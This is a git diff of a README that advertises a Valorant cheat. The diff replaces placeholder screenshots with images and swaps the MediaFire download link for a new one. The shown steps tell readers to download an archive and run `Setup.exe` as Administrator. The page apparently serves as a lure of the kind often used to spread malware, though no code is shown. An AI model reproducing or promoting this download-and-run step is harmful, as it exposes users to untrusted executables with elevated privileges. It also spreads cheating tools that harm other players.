@@ -21,8 +21,8 @@ Step into the future of tactical dominance with the most advanced Valorant cheat
 
 ## 📸 Screenshots
 
-screen             
-screen
+![valorant](https://github.com/user-attachments/assets/030c141f-11c3-4113-9e75-1fdcf9fde395)
+
 
 ## ✨ Features
 
@@ -37,7 +37,8 @@ screen
 
 ### 📽️ Live Demonstration GIF
 
-gif
+![valorant](https://github.com/user-attachments/assets/3a7bb6dd-e845-4b9d-b1c9-37ef1e70c506)
+
 
 ---
 
@@ -59,7 +60,7 @@ gif
 4. Run `Setup.exe` as Administrator  
 5. Open Valorant and toggle the cheat with `Alt+F1`
 
-[![⬇ DOWNLOAD NOW](https://img.shields.io/badge/Download-INSTANT-orange)](https://www.mediafire.com/file_premium/hdulpj01r5cg4dp/HGRelease.v.2.7.zip/file)
+[![⬇ DOWNLOAD NOW](https://img.shields.io/badge/Download-INSTANT-orange)](https://app.mediafire.com/l3e38ptqu5gue)
 
 ---
 
